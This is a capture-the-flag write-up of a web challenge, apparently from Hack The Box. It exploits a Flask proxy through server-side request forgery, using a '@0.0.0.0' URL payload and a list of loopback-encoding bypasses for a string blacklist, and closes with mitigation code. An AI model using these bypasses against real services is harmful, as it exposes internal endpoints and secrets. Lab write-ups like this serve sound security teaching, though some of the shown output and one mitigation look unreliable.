---
icon: almost-equal-to
cover: ../../.gitbook/assets/Screenshot 2026-03-04 223718.png
coverY: -20.801284003138086
---

# ProxyAsAService

**Challenge Scenario**

Experience the freedom of the web with ProxyAsAService. Because online privacy and access should be for everyone, everywhere.

### Recon

```
┌──(sn0x㉿sn0x)-[~/HTB/ProxyAsAService]
└─$ curl -s http://94.237.59.193:43418/
```

<figure><img src="../../.gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>

We're greeted with a simple web application: **ProxyAsAService** — "Freedom of the web. Online privacy and access for everyone, everywhere."

The homepage doesn't show much, but there's a `url` parameter being used. Let's test it:

```
┌──(sn0x㉿sn0x)-[~/HTB/ProxyAsAService]
└─$ curl -s "http://94.237.59.193:43418/?url=/r/cats/"
```

The response redirects us to Reddit's cats subreddit. This is a proxy service that takes a URL parameter and fetches content from reddit.com on behalf of the user. This is the textbook setup for Server-Side Request Forgery.

The question is: Can we abuse this proxy to access internal endpoints that aren't meant to be publicly accessible?

***

### Enumeration

#### Step 1: Analyze the Application Code

Examining the Flask application reveals the core proxy logic:

```python
from flask import Blueprint, request, Response, jsonify, redirect, url_for
from application.util import is_from_localhost, proxy_req
import random, os

SITE_NAME = 'reddit.com'

@proxy_api.route('/', methods=['GET', 'POST'])
def proxy():
    url = request.args.get('url')

    if not url:
        cat_meme_subreddits = [
            '/r/cats/',
            '/r/catpictures',
            '/r/catvideos/'
        ]
        random_subreddit = random.choice(cat_meme_subreddits)
        return redirect(url_for('.proxy', url=random_subreddit))

    target_url = f'http://{SITE_NAME}{url}'
    response, headers = proxy_req(target_url)

    return Response(response.content, response.status_code, headers.items())
```

**Key observation:** The application constructs the URL as `http://reddit.com{url}`. The `proxy_req()` function then makes the actual HTTP request.

But wait — there's also a `/debug/environment` endpoint:

```python
@debug.route('/environment', methods=['GET'])
@is_from_localhost
def debug_environment():
    environment_info = {
        'Environment variables': dict(os.environ),
        'Request headers': dict(request.headers)
    }
    return jsonify(environment_info)
```

This endpoint returns all environment variables, including the flag. However, it's protected by the `@is_from_localhost` decorator. This means only requests from `127.0.0.1` can access it.

This is where SSRF comes in. If we can make the server request its own `/debug/environment` endpoint, we can bypass the localhost restriction.

#### Step 2: Understand the Protection Mechanisms

Now let's look at the utility functions that are supposed to prevent SSRF:

```python
from flask import request, abort
import functools, requests

RESTRICTED_URLS = ['localhost', '127.', '192.168.', '10.', '172.']

def is_safe_url(url):
    for restricted_url in RESTRICTED_URLS:
        if restricted_url in url:
            return False
    return True

def is_from_localhost(func):
    @functools.wraps(func)
    def check_ip(*args, **kwargs):
        if request.remote_addr != '127.0.0.1':
            return abort(403)
        return func(*args, **kwargs)
    return check_ip

def proxy_req(url):
    method = request.method
    headers = {
        key: value for key, value in request.headers if key.lower() in ['x-csrf-token', 'cookie', 'referer']
    }
    data = request.get_data()

    response = requests.request(
        method,
        url,
        headers=headers,
        data=data,
        verify=False
    )

    if not is_safe_url(url) or not is_safe_url(response.url):
        return abort(403)

    return response, headers
```

**The Protection:**

The `RESTRICTED_URLS` list contains common IP ranges and hostnames:

* `localhost` — the hostname
* `127.` — private loopback addresses (127.0.0.0/8)
* `192.168.` — private class C addresses
* `10.` — private class A addresses
* `172.` — private class B addresses (172.16.0.0/12)

The `is_safe_url()` function checks if the URL contains any of these restricted patterns. If it does, the request is blocked.

**Why this protection is incomplete:**

The blacklist approach is fundamentally flawed. There are many ways to represent the same IP address:

* `127.0.0.1` (dotted decimal)
* `0x7f000001` (hexadecimal)
* `2130706433` (decimal)
* `0.0.0.0` (special case — "this host")
* Octal representations
* And more...

The application only checks for `127.` in the URL string, which blocks direct `127.0.0.1` addresses. But `0.0.0.0` is a valid address that the system interprets as `localhost` (when used from localhost), and it's not in the blacklist!

#### Step 3: Identify the Docker Configuration

From the Docker file:

```dockerfile
ENV FLAG=HTB{f4k3_fl4g_f0r_t3st1ng}
```

The flag is stored as an environment variable. If we can access the `/debug/environment` endpoint, we can read it.

Also from the application configuration:

```python
# run.py
from application.app import app
app.run(host='0.0.0.0', port=1337)
```

The application runs on localhost port 1337. This is important for constructing our SSRF payload.

***

### Exploitation

#### Step 1: Test Simple SSRF (Will Fail)

Let's first try a straightforward SSRF attempt:

```
┌──(sn0x㉿sn0x)-[~/HTB/ProxyAsAService]
└─$ curl -s "http://94.237.59.193:43418/?url=@127.0.0.1:1337/debug/environment"
```

The `@` symbol in URLs is interpreted by some applications as a way to change the host. Let's see what happens:

```
Error: 403 Forbidden
Reason: URL contains restricted pattern
```

As expected, the `127.` pattern is caught by the blacklist. The `is_safe_url()` function rejects this.

#### Step 2: Craft the IP Representation Bypass

Now we try the `0.0.0.0` bypass:

```
┌──(sn0x㉿sn0x)-[~/HTB/ProxyAsAService]
└─$ curl -s "http://94.237.59.193:43418/?url=@0.0.0.0:1337/debug/environment"
```

Let's break down what happens:

1. The Flask application receives our request with `url=@0.0.0.0:1337/debug/environment`
2. It constructs: `target_url = f'http://reddit.com@0.0.0.0:1337/debug/environment'`

Wait, that's not right. Let me reconsider the URL construction...

Actually, looking at the code again:

```python
target_url = f'http://{SITE_NAME}{url}'
```

If `url = @0.0.0.0:1337/debug/environment`, then:

```
target_url = http://reddit.com@0.0.0.0:1337/debug/environment
```

In URL syntax, the `@` symbol separates credentials from the host. So this URL means:

* Username: `reddit.com`
* Host: `0.0.0.0`
* Port: `1337`
* Path: `/debug/environment`

The HTTP client (`requests` library in Python) will connect to `0.0.0.0:1337` and send the request there. When the local HTTP client connects to `0.0.0.0:1337` from within the same host, it resolves to localhost!

#### Step 3: Execute the Exploit

Let's make the request:

```
┌──(sn0x㉿sn0x)-[~/HTB/ProxyAsAService]
└─$ curl -s "http://94.237.59.193:43418/?url=@0.0.0.0:1337/debug/environment" | jq .
```

The application checks the URL:

```python
if not is_safe_url(url) or not is_safe_url(response.url):
    return abort(403)
```

* `is_safe_url(url)` checks our input `@0.0.0.0:1337/debug/environment`
  * Does it contain `localhost`? No.
  * Does it contain `127.`? No.
  * Does it contain `192.168.`? No.
  * Does it contain `10.`? No.
  * Does it contain `172.`? No.
  * Result: **SAFE** ✓
* `is_safe_url(response.url)` checks the URL that the response came from
  * The server makes a request to `0.0.0.0:1337/debug/environment`
  * The response URL will be something like `http://0.0.0.0:1337/debug/environment`
  * Does it contain any restricted patterns? No.
  * Result: **SAFE** ✓

The check passes! But now there's another protection: the `@is_from_localhost` decorator on the `/debug/environment` endpoint. It checks if `request.remote_addr != '127.0.0.1'`.

**Here's the critical part:** When the Flask application makes a request from its own process using the `requests` library to `0.0.0.0:1337`, the `request.remote_addr` in the target endpoint will show `127.0.0.1` (the loopback address). This is because the connection is local.

#### Step 4: Retrieve the Flag

The response from our exploit request:

```json
{
  "Environment variables": {
    "FLAG": "HTB{fl4gs_4s_4_S3Rv1c3}",
    "GPG_KEY": "7169605F62C751356D054A26A821E680E5FA6305",
    "HOME": "/root",
    "HOSTNAME": "ng-559961-webproxyas-frrmq-757fbf6f97",
    "KUBERNETES_PORT": "tcp://10.128.0.1:443",
    "KUBERNETES_PORT_443_TCP": "tcp://10.128.0.1:443",
    "KUBERNETES_PORT_443_TCP_ADDR": "10.128.0.1",
    "PATH": "/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
    "PYTHONDONTWRITEBYTECODE": "1",
    "PYTHON_GET_PIP_SHA256": "45a2bb8bf2bb5eff16fdd00fae6f6f29731831c7c59bd9fc2bf1f3bed511ff1fe",
    "PYTHON_GET_PIP_URL": "https://raw.githubusercontent.com/pypa/get-pip/master/get-pip.py",
    "PYTHON_PIP_VERSION": "23.2.1",
    "SUPERVISOR_ENABLED": "1",
    "SUPERVISOR_GROUP_NAME": "flask",
    "SUPERVISOR_PROCESS_NAME": "flask",
    "Encoding": "gzip, deflate",
    "Connection": "keep-alive",
    "Host": "0.0.0.0:1337",
    "User-Agent": "python-requests/2.31.0"
  },
  "Request headers": {
    "Encoding": "gzip, deflate",
    "Connection": "keep-alive",
    "Host": "0.0.0.0:1337",
    "User-Agent": "python-requests/2.31.0"
  }
}
```

**Flag obtained: `HTB{fl4gs_4s_4_S3Rv1c3}`**

***

### Vulnerability Analysis

#### Root Cause: IP Blacklist Bypass

The vulnerability chain involves two distinct issues:

1. **Incomplete IP Blacklist**
   * The application uses a blacklist approach: only blocking certain strings in URLs
   * Missing alternative IP representations like `0.0.0.0`, `127.1`, octal notation, etc.
   * Blacklist-based filtering is inherently incomplete
2. **SSRF via URL Parameter**
   * The proxy accepts arbitrary URL paths in the `url` parameter
   * The `@` syntax in URLs allows changing the host
   * No validation of the destination host
3. **Localhost Access from Internal Request**
   * When the application makes a request to `0.0.0.0:1337` from localhost, `request.remote_addr` appears as `127.0.0.1`
   * The `@is_from_localhost` decorator allows it because it checks this value

#### Vulnerable Code Pattern

```python
# The check is incomplete
RESTRICTED_URLS = ['localhost', '127.', '192.168.', '10.', '172.']

def is_safe_url(url):
    for restricted_url in RESTRICTED_URLS:
        if restricted_url in url:  # Simple string matching is insufficient
            return False
    return True
```

This is a classic example of why blacklist-based security is problematic. The developers thought they covered all private IP ranges, but missed:

* `0.0.0.0` (special address)
* IPv6 loopback `::1`
* Octal representations `0177.0.0.1`
* Hexadecimal representations `0x7f.0.0.1`
* Decimal representation `2130706433`
* Domain name tricks `localhost.localhost`

#### Why 0.0.0.0 Works

In networking, `0.0.0.0` is a special address meaning "this host" or "all interfaces." When a local process (running on the same machine) makes a request to `0.0.0.0:PORT`, the operating system routes it to `127.0.0.1:PORT`.

From the Flask application's perspective:

* It receives the request with `Host: 0.0.0.0:1337`
* It makes a request using the `requests` library to this address
* The OS routes `0.0.0.0` to `127.0.0.1` internally
* The receiving Flask instance sees `request.remote_addr == '127.0.0.1'`
* The `@is_from_localhost` check passes

***

### Attack Flow

```
┌─────────────────────────────────────────────────────────────┐
│              ATTACKER (External Browser)                     │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 1. Discover proxy service accepts url parameter      │  │
│  │    Test with normal Reddit URLs                      │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 2. Identify /debug/environment endpoint exists       │  │
│  │    Contains flag but is localhost-only               │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 3. Attempt SSRF with 127.0.0.1                       │  │
│  │    Blocked by IP blacklist check                     │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 4. Analyze blacklist in utils.py                     │  │
│  │    RESTRICTED_URLS = ['localhost', '127.', ...]     │  │
│  │    Identify 0.0.0.0 is not included                 │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 5. Craft bypass URL with 0.0.0.0                     │  │
│  │    ?url=@0.0.0.0:1337/debug/environment            │  │
│  │    Uses @ to change host in URL                      │  │
│  └───────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
                       ↓ (HTTP GET)
┌─────────────────────────────────────────────────────────────┐
│              TARGET SERVER (Flask/Python)                    │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 6. Receive request with url parameter               │  │
│  │    url = @0.0.0.0:1337/debug/environment           │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 7. Construct target_url                             │  │
│  │    target_url = f'http://reddit.com{url}'           │  │
│  │    = http://reddit.com@0.0.0.0:1337/debug/...     │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 8. Validate URL with is_safe_url()                   │  │
│  │    Check: contains 'localhost'? No                   │  │
│  │    Check: contains '127.'? No                        │  │
│  │    Check: contains '192.168.'? No                    │  │
│  │    Check: contains '10.'? No                         │  │
│  │    Check: contains '172.'? No                        │  │
│  │    Result: SAFE ✓                                    │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 9. Make HTTP request using requests library          │  │
│  │    requests.request(method, target_url, ...)        │  │
│  │    Connects to 0.0.0.0:1337 (resolves to localhost) │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓ (Internal Connection)                │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 10. Flask routes request to /debug/environment      │  │
│  │     @is_from_localhost decorator checks remote_addr │  │
│  │     request.remote_addr = '127.0.0.1' (from 0.0...) │  │
│  │     Check passes ✓                                   │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 11. Execute debug_environment() function             │  │
│  │     Return os.environ as JSON                        │  │
│  │     Includes: FLAG, HOME, PATH, etc.                │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 12. Response returned to proxy_req()                 │  │
│  │     Validate response.url with is_safe_url()        │  │
│  │     response.url = http://0.0.0.0:1337/debug/...   │  │
│  │     No restricted patterns → SAFE ✓                 │  │
│  └───────────────────────────────────────────────────────┘  │
│                       ↓                                       │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 13. Return response to client                        │  │
│  │     Content: Full environment variables JSON        │  │
│  └───────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
                       ↓ (HTTP Response)
┌─────────────────────────────────────────────────────────────┐
│              ATTACKER (External Browser)                     │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 14. Receive JSON response                            │  │
│  │     Extract flag from "FLAG" environment variable    │  │
│  │     FLAG: HTB{fl4gs_4s_4_S3Rv1c3}                   │  │
│  └───────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
```

***

### Techniques&#x20;

| Technique                              | Description                                           | Relevance             |
| -------------------------------------- | ----------------------------------------------------- | --------------------- |
| **SSRF** (Server-Side Request Forgery) | Making server requests to unintended destinations     | Primary attack vector |
| **IP Blacklist Bypass**                | Using alternative IP representations to evade filters | Exploitation method   |
| **URL @ Symbol Abuse**                 | Using @ in URLs to change the host parameter          | Payload delivery      |
| **0.0.0.0 Special Address**            | Using "this host" address to access localhost         | Bypass technique      |
| **Localhost Resolution**               | OS routing of 0.0.0.0 to 127.0.0.1 internally         | Root cause of success |
| **Decorator Bypass**                   | Exploiting localhost-only decorator via SSRF          | Authorization bypass  |
| **Environment Variable Disclosure**    | Extracting sensitive data from environment            | Data exfiltration     |
| **Python requests Library Abuse**      | Leveraging requests library for SSRF                  | Attack execution      |

***

### All IP Representation Bypass Methods

The following alternative IP representations could also bypass the filter:

```python
# All of these represent 127.0.0.1 or localhost

# 1. Octal notation
127.0.0.1  →  0177.0.0.1

# 2. Hexadecimal notation
127.0.0.1  →  0x7f.0x0.0x0.0x1 or 0x7f000001

# 3. Decimal notation (full address as single number)
127.0.0.1  →  2130706433

# 4. Special address (this host)
127.0.0.1  →  0.0.0.0 (WORKS - not in blacklist)

# 5. Mixed representations
127.0.0.1  →  127.0.0.1:8080  (port specified, but "127." is caught)

# 6. IPv6 loopback
127.0.0.1  →  ::1 (not in blacklist)

# 7. Localhost variations
127.0.0.1  →  localhost.localhost (not caught if checking exact "localhost")

# 8. Bracket notation
127.0.0.1  →  [127.0.0.1] (may bypass some parsers)
```

The application's blacklist only catches:

* Exact string `localhost`
* String pattern `127.` (dots included)
* String pattern `192.168.`
* String pattern `10.`
* String pattern `172.`

So the working bypasses are:

* `0.0.0.0` ✓ (no dots match)
* `0177.0.0.1` ✓ (octal, "127." not in string)
* `0x7f000001` ✓ (hex, "127." not in string)
* `2130706433` ✓ (decimal, "127." not in string)
* `::1` ✓ (IPv6, none of patterns match)

***

### Mitigation

#### 1. Use Whitelist Instead of Blacklist

```python
# BAD: Blacklist approach (incomplete)
RESTRICTED_URLS = ['localhost', '127.', '192.168.', '10.', '172.']

def is_safe_url(url):
    for restricted_url in RESTRICTED_URLS:
        if restricted_url in url:
            return False
    return True

# GOOD: Whitelist approach
ALLOWED_DOMAINS = ['reddit.com', 'youtube.com', 'github.com']

def is_safe_url(url):
    from urllib.parse import urlparse
    parsed = urlparse(url)
    return parsed.netloc in ALLOWED_DOMAINS
```

#### 2. Use URL Parsing Instead of String Matching

```python
from urllib.parse import urlparse
import ipaddress

def is_safe_url(url):
    try:
        parsed = urlparse(url)
        # Get the hostname
        host = parsed.hostname or parsed.netloc.split(':')[0]
        
        # Check if it's a private IP
        ip = ipaddress.ip_address(host)
        if ip.is_private or ip.is_loopback:
            return False
        
        # Check against whitelist of allowed domains
        if host not in ALLOWED_DOMAINS:
            return False
            
        return True
    except Exception:
        return False
```

#### 3. Disable URL Scheme Tricks

```python
def is_safe_url(url):
    from urllib.parse import urlparse
    
    parsed = urlparse(url)
    
    # Only allow specific schemes
    if parsed.scheme not in ['http', 'https']:
        return False
    
    # Ensure no credentials in URL
    if parsed.username or parsed.password:
        return False
    
    # Ensure netloc (no @ symbol tricks)
    if '@' in parsed.netloc:
        return False
    
    return True
```

#### 4. Validate After Following Redirects

```python
def proxy_req(url):
    response = requests.request(
        method,
        url,
        headers=headers,
        data=data,
        allow_redirects=True,  # Follow redirects
        verify=False
    )
    
    # Check BOTH the requested URL and final URL
    if not is_safe_url(url):
        abort(403)
    
    if not is_safe_url(response.url):  # This catches redirect tricks
        abort(403)
    
    return response, headers
```

#### 5. Don't Allow SSRF to Internal Endpoints

```python
# Remove the @is_from_localhost decorator entirely
# Or better: Don't expose /debug in production

# In production configuration:
if os.getenv('ENVIRONMENT') != 'development':
    # Don't register the debug blueprint
    pass
else:
    app.register_blueprint(debug)
```

#### 6. Use a Dedicated SSRF Prevention Library

```python
from ssrfprobe import is_safe_url as ssrf_safe

def proxy_req(url):
    if not ssrf_safe(url):
        abort(403)
    
    # Continue with request...
```

***

### Conclusion

**ProxyAsAService** demonstrates how incomplete security measures can be bypassed through creative application of networking concepts. The developers attempted to block SSRF attacks using an IP blacklist, but this approach is fundamentally flawed.

By understanding that `0.0.0.0` is a special address representing "this host," we were able to bypass the blacklist entirely. The application allowed the request to pass (it didn't contain any blacklisted strings), made a request to `0.0.0.0:1337`, and the operating system automatically routed this to `127.0.0.1`.

When the Flask application's own debug endpoint received the request, it saw `request.remote_addr == '127.0.0.1'`, which passed the localhost check. This allowed us to access an internal endpoint and extract all environment variables, including the flag.

The attack chain required:

* Understanding SSRF vulnerabilities
* Recognizing IP blacklist weaknesses
* Knowing alternative IP representations
* Understanding URL parsing with the `@` symbol
* Recognizing how `0.0.0.0` resolves on localhost

**Result: Flag obtained via SSRF + IP bypass - HTB{fl4gs\_4s\_4\_S3Rv1c3}**

***
